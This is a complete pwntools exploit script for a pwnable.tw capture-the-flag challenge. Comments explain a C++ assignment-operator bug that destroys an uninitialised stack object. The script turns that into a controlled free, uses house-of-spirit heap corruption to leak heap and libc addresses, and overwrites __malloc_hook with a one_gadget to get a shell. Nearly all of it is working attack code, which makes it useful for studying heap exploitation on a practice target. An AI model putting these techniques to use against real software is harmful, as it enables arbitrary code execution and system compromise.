###House of spirit
###c++ assignment operator return type confusion -> unintended destruction of uninitialized object on stack
###Stack buffer overlap

from pwn import *

###Structure
'''
data
    |   4   |   4   |   4   |   4   |
0x00|    key_ptr    |      val      |
0x10|  change_cnt   |  year | month |
0x20|  day  |  hour |  min  |  sec  |
'''

###Util
def edit(name,size,data,value,leak=False):
    r.sendlineafter('choice: ','2')
    r.sendlineafter('name: ',name)
    r.sendlineafter('length: ',str(size))
    if 0<size<1000:
        r.sendlineafter('Key: ',data)
        r.sendlineafter('Value: ',str(value))
    if leak is True:
        return r.recvuntil('\n\nMenu',drop=True)

###Addr
#  libc2.23
name_buf = 0x6032c0
exit_got = 0x602f20
exit_offset = 0x3a030
malloc_hook_offset = 0x3c3b10
one_gadget = 0xef6c4

###Concept
#  The assignment operator has return type Data, thus a temporary Data object will be created in the stack
#  Since this is a temporary object with no additional usage, it will be destructed immediately after the assignment ends
#  However, since the assignment operator override function neglects return type and does not actually return anything
#  The process ends up destructing an uninitialized Data object
#  This is especially lethal due to the fact that a key field(char_ptr) exists and will be freed during destruction
#  Thus if the ptr is controllable, arbitrary free will be available
#  Further inspection showed that the char buf in set_name() actually overlaps with temp Data object in edit(), and makes key controllable
#  Thus we can perform house of spirit to allocate chunk onto bss, leak address, and overwrite malloc_hook

###Exploit
r = remote('chall.pwnable.tw',10306)

###Initialize data
#  The key size is set to 0x37 to ensure there is a freed 0x41 chunk on heap (allocated when ker string is being passed to Data constructor)
#  This chunk is needed to help in leaking heap addr
#  It is also noticeable that this size matches Data object size, which is also useful in hijacking the object content later
r.sendlineafter('name: ','M30W')
r.sendlineafter('key: ','\x00'*0x37)
r.sendlineafter('value: ','0')

###Leak heap
#  The first edit frees a 0x20 chunk on name_buf, which will then be malloced as new key buf
#  The second edit then frees a 0x40 chunk at the same location, thus writing previously free 0x40 chunk address into key buf
edit(p64(0)+p64(0x21)+p64(0)*3+p64(0x21)+b'\x00'*0x30+p64(name_buf+0x10),0x17,b'a'*0x17,0,leak=False)
leak = edit(p64(0)+p64(0x41)+p64(0)*7+p64(0x21)+b'\x00'*0x10+p64(name_buf+0x10),0,None,None,leak=True)
heap_addr = u64(leak.split(b'Key: ')[2].split(b'\n')[0].ljust(8,b'\x00'))-0x11c10-0x30-0x50
print(hex(heap_addr))
data_chunk = heap_addr+0x11c10+0x30+0x50+0x40

###Leak libc
#  The first edit is used to hijack the next_ptr of key_buf, making it point to Data chunk on heap
#  The second edit then mallocs a chunk to overlap Data chunk and hijack key_ptr to exit_got, thus leaking libc
edit(p64(0)+p64(0x41)+p64(data_chunk)+p64(0)*6+p64(0x21)+b'\x00'*0x10+p64(0),0x37,b'\x00',0,leak=False)
leak = edit(p64(0)+p64(0x41)+p64(data_chunk)+p64(0)*6+p64(0x21)+b'\x00'*0x10+p64(0),0x37,p64(exit_got),0,leak=True)
exit_addr = u64(leak.split(b'Key: ')[2].split(b'\n')[0].ljust(8,b'\x00'))
libc_base = exit_addr-exit_offset
print(hex(libc_base))

###Hijack malloc hook
#  Finally, do the hijack next_ptr trick once again and edit malloc_hook to one_gadget
edit(p64(0)+p64(0x71)+p64(0)*10+p64(name_buf+0x10)+p64(0)*2+p64(21),0,None,None,leak=False)
edit(p64(0)+p64(0x71)+p64(libc_base+malloc_hook_offset-0x23)+p64(0)*12+p64(21),0x67,b'\x00',0,leak=False)
edit(b'\x00'*0x68,0x67,b'\x00'*0x13+p64(libc_base+one_gadget),0,leak=False)
r.interactive()
